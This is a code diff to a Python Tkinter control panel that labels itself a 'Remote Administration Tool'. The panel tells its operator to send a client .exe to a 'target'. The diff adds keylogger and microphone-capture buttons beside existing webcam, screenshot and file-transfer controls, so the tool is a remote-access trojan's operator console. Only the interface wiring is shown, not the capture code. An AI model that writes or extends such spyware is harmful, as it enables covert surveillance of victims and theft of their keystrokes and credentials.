@@ -60,6 +60,7 @@ edit_menu.add_command(label="Clear Logs",     command=lambda: log_text.delete("1
 tools_menu = tk.Menu(menubar, tearoff=0)
 menubar.add_cascade(label="Tools", menu=tools_menu)
 tools_menu.add_command(label="📸 Capture Screenshot", command=feat.capture_screenshot)
+tools_menu.add_command(label="⌨️ Keylog Capture",    command=feat.capture_keylog)
 tools_menu.add_command(label="💬 Send Popup",         command=feat.send_popup_message)
 tools_menu.add_command(label="📊 System Info",        command=lambda: cmds.send_command_from_button("SYSINFO", "System Info"))
 
@@ -193,6 +194,8 @@ tk.Label(adv_frame, text="🚀 ADVANCED", font=("Segoe UI", 10, "bold"), bg="#E8
 adv_btns = [
     ("📸 Screenshot",  feat.capture_screenshot,        "#5E35B1"),
     ("📷 Webcam",      feat.capture_webcam,            "#E94560"),
+    ("🎤 Microphone",  feat.capture_microphone,        "#00ACC1"),
+    ("⌨️ Keylog",      feat.capture_keylog,            "#FF6F00"),
     ("📥 Download",    feat.download_file_from_client, "#00897B"),
     ("📤 Upload",      feat.upload_file_to_client,     "#6A1B9A"),
     ("💬 Send Popup",  feat.send_popup_message,        "#0277BD"),
@@ -204,6 +207,7 @@ for text, cmd, color in adv_btns:
                     activebackground=color, activeforeground="white")
     btn.pack(fill="x", padx=10, pady=4)
     advanced_buttons.append(btn)
+g.keylog_button = advanced_buttons[3]
 tk.Label(adv_frame, text="", bg="#E8EAF6").pack(pady=5)
 
 # ── System Control ────────────────────────────────────────────────────────────
@@ -279,6 +283,7 @@ terminal_output.tag_config("error",     foreground="#FF0000", font=(term_font[0]
 terminal_output.tag_config("warning",   foreground="#FFFF00", font=(term_font[0], 12))
 terminal_output.tag_config("separator", foreground="#808080", font=term_font)
 terminal_output.tag_config("loading",   foreground="#FFA657", font=(term_font[0], 11, "italic"))
+terminal_output.tag_config("keylog",    foreground="#00FF88", font=(term_font[0], 11))
 
 terminal_output.insert(tk.END, "Remote Administration Tool - Enterprise v2.0\n", "success")
 terminal_output.insert(tk.END, "Click 'Start Server' then send client .exe to target.\n\n", "output")
